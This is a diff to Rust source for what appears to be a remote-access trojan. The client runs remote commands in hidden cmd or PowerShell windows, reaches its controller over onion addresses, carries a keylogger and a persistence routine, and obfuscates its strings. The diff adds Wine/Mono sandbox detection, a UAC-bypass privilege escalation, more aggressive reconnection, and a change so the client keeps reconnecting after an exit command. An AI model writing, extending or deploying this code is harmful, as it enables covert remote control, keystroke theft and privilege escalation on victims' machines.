@@ -40,6 +40,26 @@ use screenshots::image::ImageOutputFormat;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
+#[cfg(target_os = "windows")]
+fn prefer_powershell() -> bool {
+    use std::sync::OnceLock;
+    static CACHE: OnceLock<bool> = OnceLock::new();
+    *CACHE.get_or_init(|| {
+        std::process::Command::new("powershell.exe")
+            .args(["-NoProfile", "-Command", "gci"])
+            .output()
+            .ok()
+            .map(|o| {
+                let out = String::from_utf8_lossy(&o.stdout);
+                let err = String::from_utf8_lossy(&o.stderr);
+                !out.trim().is_empty()
+                    && !err.to_lowercase().contains("wine")
+                    && !out.to_lowercase().contains("mono")
+            })
+            .unwrap_or(false)
+    })
+}
+
 const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");
 
 fn parse_onion_line(line: &str) -> Option<ClientConfig> {
@@ -398,11 +418,17 @@ Available commands:
 
         _ => {
             #[cfg(target_os = "windows")]
-            let mut command = {
+            let mut command = if prefer_powershell() {
+                let mut c = Command::new(astr!("powershell.exe"));
+                c.arg(astr!("-NoProfile"))
+                    .arg(astr!("-Command"))
+                    .arg(input);
+                c.creation_flags(CREATE_NO_WINDOW);
+                c
+            } else {
                 let mut c = Command::new(astr!("cmd.exe"));
-                c.arg(astr!("/C"))
-                    .arg(input)
-                    .creation_flags(CREATE_NO_WINDOW);
+                c.arg(astr!("/C")).arg(input);
+                c.creation_flags(CREATE_NO_WINDOW);
                 c
             };
 
@@ -651,8 +677,7 @@ pub async fn netclient_run(
 
                 match read_loop(stream, keylogger.clone()).await {
                     Ok(true) => {
-                        println!("{}", &astr!("Exit requested"));
-                        break;
+                        println!("{}", &astr!("Exit requested, reconnecting..."));
                     }
                     Ok(false) => {
                         println!("{}", &astr!("Connection closed"));
@@ -666,7 +691,7 @@ pub async fn netclient_run(
                 println!("{}{}", astr!("Connection failed: "), e);
             }
         }
-        let delay = rand_range(13, 121);
+        let delay = rand_range(5, 30);
         println!(
             "{}{}{}",
             astr!("Reconnecting in "),
@@ -695,7 +720,16 @@ async fn netclient_impl() -> c_int {
         astr!("s")
     );
     sleep(Duration::from_secs(startup_delay)).await;
+
     let _ = persist::persist();
+
+    #[cfg(target_os = "windows")]
+    if !is_elevated() {
+        if let Ok(exe) = std::env::current_exe() {
+            let path = exe.to_string_lossy().to_string();
+            uac_bypass::uac_slui(&path);
+        }
+    }
 
     let configs = get_onion_configs();
     if configs.is_empty() {
